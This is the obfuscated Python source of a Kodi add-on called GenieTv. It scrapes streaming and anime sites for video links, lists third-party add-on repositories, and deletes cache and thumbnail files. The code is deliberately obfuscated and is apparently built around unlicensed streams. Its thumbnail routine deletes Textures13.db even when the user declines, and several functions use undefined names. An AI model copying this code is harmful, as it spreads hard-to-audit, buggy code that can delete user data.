    if 83 - 83: OoooooooOO . OOOo0 + oO0O * O0 / Ooo0OO0oOO
iIIII1i1 = '{SF},' ; I1I1 = '{IF},' ; oO00o0oOoo = '{PW},' ; OoooOO0 = '{AM},' ; oOOI1 = '{GF},' ; OOI1i = '{DD},' ; i1II1iII1 = '{UO},' ; O00oIi11Iiii1iiii = '{LE},' ; i1IIII1111 = '{ZY},' ; Ooo0o0000OO = '{UE},' ; iIiI1II1I1 = '{PE},' ; OooiIiI1i1Ii = '{JE},' ; III1I1 = '{TH},' ; iI1IIIIII = '{LK},'
if 8 - 8: i1IIi + OoOoOO00 / oO0O + ii11ii1ii % oO0O - iIii1I11I1II1
if 29 - 29: Oo + OoOoOO00
def oOOo00ooO ( ) :
 IIIII1II = i11iIIIIIi1 ( 'http://www.iwatchseries.me/tv-list/' )
 OoOO0oo0o = re . compile ( '<h5><a href="([^"]*)"><strong>(.+?)</strong></a></h5>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , I1i11i , 8021 , ii11iIi1I + 'iwatch.png' )
def ooOo ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<h5><strong><a href="([^"]*)">(.+?)</a>(.+?)</strong></h5>' ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO , ii1i in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO + ii1i , url , 8022 , ii11iIi1I + 'iwatch.png' )
def OOOoOo0oO0OoO ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<iframe src="([^"]*)"' ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  print '>>>>>>>>>>>>>>>>>>>>' + url
  I1ii11 ( url )
def I1ii11 ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '{.+?"file" : "(.+?)",.+?"default" : true.+?"label" : "(.+?)"' , re . DOTALL ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( 'setup\(\{.+?file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( IIIII1II )
 I1I1Iiii1 = re . compile ( "{ label: '([^']*)', file:.+?'([^']*)' }" ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( 'VidSpot - ' + OO0ooOOO0OOO , url , 222 , ii11iIi1I + 'iwatch.png' )
 for url in II11i1I11Ii1i :
  IIi1I ( 'VodLocker' , url , 222 , ii11iIi1I + 'iwatch.png' )
 for OO0ooOOO0OOO , url in I1I1Iiii1 :
  print '<><><><><><><><><><><> before   ' + url
  if 'hevideo' in url :
   print '>>>>>>>>>>>>>>>>>>>>>>>>>' + url
   IIi1I ( 'TheVideo - ' + OO0ooOOO0OOO , url , 222 , ii11iIi1I + 'iwatch.png' )
   if 65 - 65: I1I1ii + II1i1IiiIIi11 * II1i1IiiIIi11
def OoOO ( ) :
 IIIII1II = cloudflare . source ( 'http://www.animeland.me/anime-list' )
 OoOO0oo0o = re . compile ( 'letter-spacing:-1px;" href="([^"]*)">(.+?)</a></li>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , I1i11i , 1021 , ii11iIi1I + 'anime.png' )
  if 10 - 10: ii11ii1ii . OOooOOo
  if 75 - 75: O0 * i1IIi - OOoo0OO0 / i11i1 % i11i1 / I1IiI
def Iii1i1Ii ( ) :
 IIIII1II = i11iIIIIIi1 ( 'http://www.animetoon.org/cartoon' )
 OoOO0oo0o = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , I1i11i , 1002 , ii11iIi1I + 'anime.png' )
  if 23 - 23: I1IiI - oO0O - Ooo0OO0oOO / OoooooooOO
  if 12 - 12: OoooooooOO
  if 55 - 55: ii11ii1ii + ii11ii1ii
def o0o0OOo0OOoO ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 II11i1I11Ii1i = re . compile ( '<img src="(.+?)" id="series_image" width="250" height="370" alt=".+?" />' ) . findall ( IIIII1II )
 for IIIIiI11I11 in II11i1I11Ii1i :
  o0O0 = IIIIiI11I11
 I1I1Iiii1 = re . compile ( '<li><a href="(.+?)">Next</a></li>' ) . findall ( IIIII1II )
 for url in I1I1Iiii1 :
  I1111I1II11 ( 'NEXT PAGE' , url , 1002 , ii11iIi1I + 'Next.png' )
 OoOO0oo0o = re . compile ( '&nbsp;<a href="(.+?)">(.+?)</a>' ) . findall ( IIIII1II )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( OO0ooOOO0OOO , url , 1003 , o0O0 )
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def O0ooO ( url , IMAGE ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '"playlist">(.+?)</span></div><div><iframe src="(.+?)"' ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , url in OoOO0oo0o :
  print OO0ooOOO0OOO + '     ' + url
  if 'easy' in url :
   i1Ii1IiiIi1II ( url )
  elif 'playpanda' in url :
   i1Ii1IiiIi1II ( url )
   if 54 - 54: oO0O % i1IIi
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def i1Ii1IiiIi1II ( url ) :
 IIIII1II = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( "url: '(.+?)'," ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  IIi1I ( 'STREAM' , url , 222 , ii11iIi1I + 'anime.png' )
  if 51 - 51: iIii1I11I1II1 - OOOo0
  if 61 - 61: OoooooooOO . oO0O % Ooo0OO0oOO * OoooooooOO
def O00o0O0oo ( url ) :
 IIiiiI1iI = urllib2 . Request ( url )
 IIiiiI1iI . add_header ( 'User-Agent' , "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" )
 IIiiiI1iI . add_header ( 'referer' , url )
 O0O0 = urllib2 . urlopen ( IIiiiI1iI )
 oo0OoOOO0o0 = O0O0 . read ( )
 O0O0 . close ( )
 return oo0OoOOO0o0
 if 34 - 34: Ooo00oOo00o % Oo + Ooo00oOo00o
def iI1 ( url ) :
 IIiiiI1iI = urllib2 . Request ( url )
 IIiiiI1iI . add_header ( 'User-Agent' , "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" )
 O0O0 = urllib2 . urlopen ( IIiiiI1iI )
 oo0OoOOO0o0 = O0O0 . read ( )
 O0O0 . close ( )
 return oo0OoOOO0o0
 if 77 - 77: Oo * oOO % oO0O
def I1iI ( url ) :
 xbmcplugin . addSortMethod ( handle = int ( sys . argv [ 1 ] ) , sortMethod = xbmcplugin . SORT_METHOD_TITLE )
 I111Ii = ( '%s%s' % ( II11iIi , url ) )
 oo0OoOOO0o0 = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( oo0OoOOO0o0 )
 for url , IIii11Ii1i1I , OO0ooOOO0OOO in OoOO0oo0o :
  IIi1I ( '%s' % ( OO0ooOOO0OOO ) . replace ( 'GenieTv' , '[COLOR green]GenieTV[/COLOR]' ) . replace ( '.' , ' ' ) . replace ( 'mp4' , '' ) . replace ( 'mkv' , '' ) . replace ( '_' , ' ' ) , '%s' % ( url ) , 222 , IIii11Ii1i1I )
  if 33 - 33: ii11ii1ii / i1IIi / iI1Ii11iII1 - i1IIi . OOOo0
def I1i111I ( url ) :
 oO0ooOO = xbmc . Player ( iIi11I11 ( ) )
 import urlresolver
 try : oO0ooOO . play ( url )
 except : pass
 from urlresolver import common
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( 'LOADING' , 'Opening %s Now' % ( OO0ooOOO0OOO ) )
 oO0ooOO = xbmc . Player ( iIi11I11 ( ) )
 url = urlresolver . HostedMediaFile ( url ) . resolve ( )
 if Oo0oO0ooo . iscanceled ( ) :
  print "[COLORred]STREAM CANCELLED[/COLOR]"
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  if i1iiIIiiI111 . yesno ( "[B]CANCELLED[/B]" , '[B]Was There A Problem[/B]' , '' , "" , 'Yes' , 'No' ) :
   i1iiIIiiI111 . ok ( "Message Send" , "Your Message Has Been Sent" )
  else :
   return
 else :
  try : oO0ooOO . play ( url )
  except : pass
  try : o0oO0 . resolve_url ( url )
  except : pass
  Oo0oO0ooo . close ( )
  if 48 - 48: oOO + i11i1 . I1I1ii % OoOoOO00 + Ooo0OO0oOO
def iiI1ii1i1 ( url ) :
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( 'Featching Your Video' , 'Featching Your Video' )
 Oo0oO0ooo . update ( 0 , '%s' % OO0ooOOO0OOO )
 xbmc . sleep ( 1 )
 oO0ooOO = xbmc . Player ( iIi11I11 ( ) )
 Oo0oO0ooo . update ( 100 , '%s' % OO0ooOOO0OOO )
 xbmc . sleep ( 1 )
 oO0ooOO . play ( url ) . strip ( )
 Oo0oO0ooo . close ( )
 if 42 - 42: OoooooooOO
def o00OOo ( url ) :
 oO0ooOO = xbmc . Player ( iIi11I11 ( ) )
 import urlresolver
 url = ( url ) . strip ( )
 try : oO0ooOO . play ( url ) . strip ( )
 except : pass
 if 30 - 30: i1IIi . ii11ii1ii
 if 77 - 77: OoOoOO00 - i11iIiiIii
def iIi11I11 ( ) :
 try :
  o0o00O0oOOo = getSet ( "core-player" )
  if ( o0o00O0oOOo == 'DVDPLAYER' ) : O0ooOiI = xbmc . PLAYER_CORE_DVDPLAYER
  elif ( o0o00O0oOOo == 'MPLAYER' ) : O0ooOiI = xbmc . PLAYER_CORE_MPLAYER
  elif ( o0o00O0oOOo == 'PAPLAYER' ) : O0ooOiI = xbmc . PLAYER_CORE_PAPLAYER
  else : O0ooOiI = xbmc . PLAYER_CORE_AUTO
 except : O0ooOiI = xbmc . PLAYER_CORE_AUTO
 return O0ooOiI
 return True
 if 92 - 92: Ooo00oOo00o . OOooOOo . oO0O % I1IiI
def I1111I1II11 ( name , url , mode , iconimage , showcontext = True , allinfo = { } ) :
 o0OO = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name )
 II1I1 = True
 iii11I11iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iii11I11iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 if showcontext :
  OO00O00o0O = [ ]
  if showcontext == 'fav' :
   OO00O00o0O . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in O000OO0 :
   OO00O00o0O . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , mode ) ) )
  iii11I11iI1 . addContextMenuItems ( OO00O00o0O )
 II1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0OO , listitem = iii11I11iI1 , isFolder = True )
 return II1I1
 if 100 - 100: Ooo00oOo00o % I1IiI / OOoo0OO0 * O0 - Ooo0OO0oOO
def O00ooOo ( name , url , mode , iconimage , fanart , description ) :
 if 34 - 34: II1i1IiiIIi11 % i11iIiiIii + i11iIiiIii - II1i1IiiIIi11
 o0OO = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 II1I1 = True
 iii11I11iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iii11I11iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iii11I11iI1 . setProperty ( "Fanart_Image" , fanart )
 II1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0OO , listitem = iii11I11iI1 , isFolder = True )
 return II1I1
 if 2 - 2: OoOoOO00 + i1IIi
def IIi1I ( name , url , mode , iconimage , showcontext = True , allinfo = { } ) :
 o0OO = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name )
 II1I1 = True
 iii11I11iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iii11I11iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 if showcontext :
  OO00O00o0O = [ ]
  if showcontext == 'fav' :
   OO00O00o0O . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in O000OO0 :
   OO00O00o0O . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , mode ) ) )
  iii11I11iI1 . addContextMenuItems ( OO00O00o0O )
 II1I1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o0OO , listitem = iii11I11iI1 , isFolder = False )
 return II1I1
 if 68 - 68: i11i1 + oO0O
 if 58 - 58: iI1Ii11iII1 * oO0O . i1IIi
 if 19 - 19: Ooo0OO0oOO
 if 85 - 85: oOO - OOOo0 / i1IIi / Ooo00oOo00o / OoOoOO00
 if 94 - 94: iIii1I11I1II1 + iI1Ii11iII1
 if 44 - 44: Ooo00oOo00o + OOoo0OO0 % Ooo00oOo00o + i1IIi + II1i1IiiIIi11 + O0
def ooO00OO0 ( heading , announce ) :
 class Ii1iII1ii1 ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try : ooOOo00O00Oo = open ( announce ) ; ooOo0 = ooOOo00O00Oo . read ( )
   except : ooOo0 = announce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( ooOo0 ) )
   return
 Ii1iII1ii1 ( )
 Ii1iII1ii1 ( )
 if 41 - 41: I1I1ii + Ooo00oOo00o * OOOo0 * O0 * Oo - I1IiI
def ooooOoo00 ( ) :
 ooO00OO0 ( 'These are the main Sources you should get into you XBMC' , '[COLORwhite]http://architects.x10host.com[/COLOR]--- [CR]  [COLORred]http://repo.sharktech.co.uk[/COLOR]--- [CR]   [COLORwhite]http://fusion.tvaddons.ag[/COLOR]--- [CR]  [COLORred]http://i.totalxbmc.tv[/COLOR]--- [CR]   [COLORwhite]http://www.xunitytalk.com/xfinity[/COLOR]--- [CR]  [COLORred]http://srp.nu[/COLOR]--- [CR]   [COLORwhite]http://solved.no-issue.ca[/COLOR]--- [CR]  [COLORred]http://xbmc.aminhacasadigital.com[/COLOR]--- [CR]   [COLORwhite]http://xbmc.movieshd.co[/COLOR]--- [CR]  [COLORred]http://install.kaosbox.tv[/COLOR]--- [CR]   [COLORwhite]http://kodi-repo.com/mxr[/COLOR]--- [CR]  [COLORred]http://kodi.metalkettle.co[/COLOR]--- [CR]   [COLORwhite]http://prozone.getxbmc.com[/COLOR]--- [CR]  [COLORred]http://transform.mega-tron.tv[/COLOR]--- [CR]   [COLORwhite]http://muckys.kodimediaportal.ml[/COLOR]--- [CR]  [COLORred]http://jas0npc.pcriot.com[/COLOR]--- [CR]  [COLORwhite]Sports devil source[/COLOR]--- [CR]  [COLORred]http://iwillfolo.com/iwf[/COLOR]' )
 if 7 - 7: i11i1 * Ooo00oOo00o + OoooooooOO . oOO * OOoo0OO0
 if 82 - 82: iIii1I11I1II1 * OoooooooOO
 if 50 - 50: I1I1ii - OoOoOO00
 if 33 - 33: iI1Ii11iII1 / iI1Ii11iII1 . i11iIiiIii * ii11ii1ii + OOooOOo
 if 16 - 16: iI1Ii11iII1
def o0Oo00 ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , '' , '                                 REFRESH SUCCESSFUL :)' , "                          [COLOR gold]Brought To You By Kodi Support Group, GenieTv[/COLOR]" )
 return
 if 10 - 10: I1IiI . iI1Ii11iII1 * iIii1I11I1II1 - Ooo0OO0oOO - I1IiI / I1I1ii
 if 13 - 13: Ooo0OO0oOO + I1IiI % iI1Ii11iII1 % OoooooooOO
 if 22 - 22: I1I1ii
 if 23 - 23: O0
 if 41 - 41: i1IIi . i11i1 / oOO / OOooOOo % iI1Ii11iII1 - oO0O
 if 14 - 14: ii11ii1ii - i11iIiiIii * I1I1ii
 if 39 - 39: OoooooooOO
 if 19 - 19: i11iIiiIii
 if 80 - 80: OOOo0
 if 58 - 58: Ooo0OO0oOO + ii11ii1ii % I1IiI
 if 22 - 22: iIii1I11I1II1 - oO0O / OOOo0 * iI1Ii11iII1
 if 26 - 26: OOooOOo + i11i1 - OOooOOo + Oo . Ooo0OO0oOO
 if 97 - 97: i1IIi
 if 46 - 46: ii11ii1ii
 if 30 - 30: Ooo00oOo00o / O0 * OOooOOo * I1I1ii + OoooooooOO * II1i1IiiIIi11
 if 23 - 23: OOoo0OO0
 if 36 - 36: iI1Ii11iII1 . II1i1IiiIIi11 - i1IIi + I1I1ii
 if 54 - 54: OoooooooOO . Ooo0OO0oOO - II1i1IiiIIi11
 if 76 - 76: I1I1ii
 if 61 - 61: oOO / OoOoOO00 * oOO * I1IiI * I1I1ii . i11iIiiIii
 if 26 - 26: I1I1ii / oOO - Ooo00oOo00o . iIii1I11I1II1
 if 83 - 83: oOO % oO0O / Oo - II1i1IiiIIi11 / O0
 if 97 - 97: iIii1I11I1II1 * OOoo0OO0
 if 95 - 95: Ooo00oOo00o
def OoiIIii1Ii1 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + o0O0o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 47 - 47: i11i1 * oO0O % iIii1I11I1II1 / oOO
def O0O00O ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + O0ooOIii1iIIIi11I1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 38 - 38: Oo * ii11ii1ii - oOO % ii11ii1ii
def I11II1 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + III11I11iIi1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 10 - 10: OOoo0OO0 % OoOoOO00 * OOOo0 % i1IIi * i11iIiiIii + I1IiI
def oo0OoOO000O ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + Oo0o0OoOoOo0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 36 - 36: oO0O * OOOo0 * ii11ii1ii . OOoo0OO0 * ii11ii1ii
def O0ooO0 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + iII1i111iI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 9 - 9: i11iIiiIii + i11i1 - I1IiI / oOO % i1IIi / Ooo0OO0oOO
def iiI1II1II111 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + OoO00oO0o00 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 25 - 25: oOO . OOooOOo % OOOo0 + II1i1IiiIIi11
def OOO0OOoOOO ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + oOoO0o0o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 72 - 72: OOoo0OO0 * I1IiI % I1I1ii % oOO
def i1iI11iI ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + oOo0OOoO0ooOOoo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 95 - 95: Oo * i11i1 + OOOo0 . O0
def IIiIi1II1IiI ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + oo0OoOI11iIiiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 42 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 88 - 88: ii11ii1ii - OOoo0OO0 * OoooooooOO * II1i1IiiIIi11 . i11iIiiIii . OOooOOo
def OooOoO0OO00 ( url ) :
 oo0OoOOO0o0 = i11iIIIIIi1 ( iiI1IiI + OOOoOOOo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoOO0oo0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oo0OoOOO0o0 )
 for OO0ooOOO0OOO , url , IiI , iI1ii1i , o0OoOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 5 , IiI , iI1ii1i , o0OoOO )
 Oo0oO ( 'movies' , 'MAIN' )
 if 82 - 82: Oo + I1I1ii
 if 93 - 93: OOoo0OO0 * O0 * i11i1 - OOooOOo / ii11ii1ii
 if 54 - 54: i1IIi - Ooo00oOo00o / OoooooooOO
 if 95 - 95: O0 + iIii1I11I1II1 . ii11ii1ii
 if 61 - 61: oO0O * oO0O
 if 70 - 70: I1I1ii . ii11ii1ii / OOooOOo * Ooo0OO0oOO
 if 74 - 74: OOOo0 . oOO / II1i1IiiIIi11 . iI1Ii11iII1
 if 74 - 74: Oo / I1I1ii % I1I1ii . iI1Ii11iII1
 if 72 - 72: i1IIi
def I1Iii11111I1iii ( ) :
 try :
  if os . path . exists ( oOOoO0 ) == True :
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   if i1iiIIiiI111 . yesno ( "Delete Thumbnails" , "[COLOR gold][B]##########WARNING ANDROID ONLY##########[/B][/COLOR]" , "This feature deletes your thumbnail folder and textures13.db" , "Are you sure you want to do proceed? This Can NOT Be Undone" ) :
    for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( oOOoO0 ) :
     OO0Oo00 = 0
     OO0Oo00 += len ( o0O0Oo00 )
     if OO0Oo00 > 0 :
      for ooOOo00O00Oo in o0O0Oo00 :
       os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
  IIi11I = os . path . join ( OOooO0OOoo , "Textures13.db" )
  os . unlink ( IIi11I )
  i1iiIIiiI111 . ok ( "Restart KODI" , "Please restart KODI to rebuild thumbnail library" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Thumbnails please visit Kodi Support Group, GenieTv on facebook" )
 return
 if 61 - 61: i11i1 + i11i1 + Ooo0OO0oOO / iIii1I11I1II1
 if 91 - 91: OOOo0 / OoOoOO00 * i11i1
 if 94 - 94: OoOoOO00 - iIii1I11I1II1 - iIii1I11I1II1
 if 83 - 83: ii11ii1ii * iIii1I11I1II1 + I1IiI * i1IIi . OoooooooOO % oO0O
 if 81 - 81: Ooo00oOo00o - iIii1I11I1II1
 if 60 - 60: I1I1ii
 if 77 - 77: OOOo0 / ii11ii1ii
 if 95 - 95: I1I1ii * i1IIi + Ooo0OO0oOO
 if 40 - 40: OoOoOO00
def iII1 ( url ) :
 print '############################################################       DELETING STANDARD CACHE             ###############################################################'
 iIi1i1II = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'cache' )
 if os . path . exists ( iIi1i1II ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( iIi1i1II ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 62 - 62: Oo * iIii1I11I1II1
   if 11 - 11: ii11ii1ii + II1i1IiiIIi11
   if OO0Oo00 > 0 :
    if 77 - 77: i1IIi
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete KODI Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 63 - 63: Ooo0OO0oOO . I1I1ii * OoOoOO00 - Ooo0OO0oOO
     for ooOOo00O00Oo in o0O0Oo00 :
      try :
       os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
      except :
       pass
     for oO0o00oOOooO0 in i1oO0OO0 :
      try :
       shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      except :
       pass
       if 45 - 45: Ooo0OO0oOO % oOO + I1I1ii + OOooOOo . Oo
   else :
    pass
 if xbmc . getCondVisibility ( 'system.platform.ATV2' ) :
  I111 = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
  if 37 - 37: II1i1IiiIIi11
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( I111 ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
